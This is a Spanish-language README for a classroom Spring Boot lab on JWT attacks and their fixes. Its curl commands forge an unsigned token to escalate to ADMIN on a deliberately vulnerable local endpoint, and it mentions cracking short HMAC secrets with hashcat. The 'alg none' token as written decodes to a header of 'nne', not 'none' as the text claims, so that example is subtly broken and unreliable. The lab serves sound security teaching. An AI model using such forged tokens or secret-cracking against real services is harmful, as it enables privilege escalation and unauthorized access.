# Demo JWT — Spring Boot (ataques y mitigaciones)

Tres problemas del laboratorio integrador de la **Sesión 5**:

1. **Algoritmo `none` aceptado** (CVSS ~9.1)
2. **Secreto HMAC débil** (`MiSecreto12` — 12 caracteres)
3. **Sin validación de `iss` / `aud`**

| Variante | Emitir token | Verificar |
|----------|--------------|-----------|
| MAL | `POST /api/jwt/vulnerable/issue` | `GET /api/jwt/vulnerable/verify` |
| BIEN | `POST /api/jwt/seguro/issue` | `GET /api/jwt/seguro/verify` |

Puerto: **8201**

---

## Cómo levantarlo

```bash
cd spring-jwt-attacks
docker compose up --build
```

---

## Simulación de ataques

**1. Token legítimo (vulnerable)**

```bash
TOKEN=$(curl -s -X POST http://localhost:8201/api/jwt/vulnerable/issue \
  -H "Content-Type: application/json" \
  -d '{"subject":"user1","role":"USER"}' | jq -r .token)

curl -s http://localhost:8201/api/jwt/vulnerable/verify \
  -H "Authorization: Bearer $TOKEN" | jq .
```

**2. Ataque alg=none — escalar a ADMIN sin firma**

Token preconstruido (header `{"alg":"none"}`, payload `{"sub":"admin","role":"ADMIN"}`):

```bash
NONE_TOKEN='eyJhbGciOiJubmUifQ.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9.'

curl -s http://localhost:8201/api/jwt/vulnerable/verify \
  -H "Authorization: Bearer $NONE_TOKEN" | jq .
```

→ La API vulnerable **acepta** el token y devuelve `role: ADMIN`.

**3. Mismo ataque contra validación segura**

```bash
curl -s http://localhost:8201/api/jwt/seguro/verify \
  -H "Authorization: Bearer $NONE_TOKEN" | jq .
```

→ **401** — firma y algoritmo rechazados.

**4. Token de otro servicio (iss/aud) — rechazado en seguro**

Emite con el emisor vulnerable y prueba en seguro; fallará por issuer/audience.

---

## Herramientas externas (opcional)

- **jwt.io** — decodificar y editar payloads
- **Burp JWT Editor** o **jwt_tool** — fuzzing de algoritmos y claims
- **hashcat** — fuerza bruta sobre secretos HMAC cortos

---

## Windows — cmd

```cmd
curl.exe -s http://localhost:8201/api/jwt/vulnerable/verify -H "Authorization: Bearer eyJhbGciOiJubmUifQ.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9."
```
